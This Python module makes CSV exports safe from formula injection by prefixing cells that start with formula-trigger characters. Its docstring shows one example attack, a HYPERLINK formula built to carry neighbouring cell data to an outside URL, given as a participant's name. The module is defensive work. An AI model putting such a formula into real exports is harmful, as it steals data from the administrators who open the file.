"""CSV exports a spreadsheet cannot be tricked into executing.

A cell that starts with `=`, `+`, `-`, `@`, a tab or a carriage return is
read by Excel and LibreOffice as a formula. Exported cells carry text a
participant typed herself — her name above all — so a name such as
`=HYPERLINK("http://…?"&A1)` would run on the administrator's machine and
could carry the neighbouring cells away. Such a cell is prefixed with `'`,
which every spreadsheet shows as plain text. Numbers are left as numbers.
"""

from __future__ import annotations

import csv
from collections.abc import Iterable
from typing import Any

_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value: Any) -> Any:
    """The value, neutralised when a spreadsheet would read it as a formula."""
    if isinstance(value, str) and value.startswith(_TRIGGERS):
        return "'" + value
    return value


class SafeWriter:
    """`csv.writer` that neutralises every cell it writes."""

    def __init__(self, buffer, **kwargs: Any) -> None:
        self._writer = csv.writer(buffer, **kwargs)

    def writerow(self, row: Iterable[Any]) -> Any:
        return self._writer.writerow([csv_safe(cell) for cell in row])

    def writerows(self, rows: Iterable[Iterable[Any]]) -> None:
        for row in rows:
            self.writerow(row)


def writer(buffer, **kwargs: Any) -> SafeWriter:
    return SafeWriter(buffer, **kwargs)
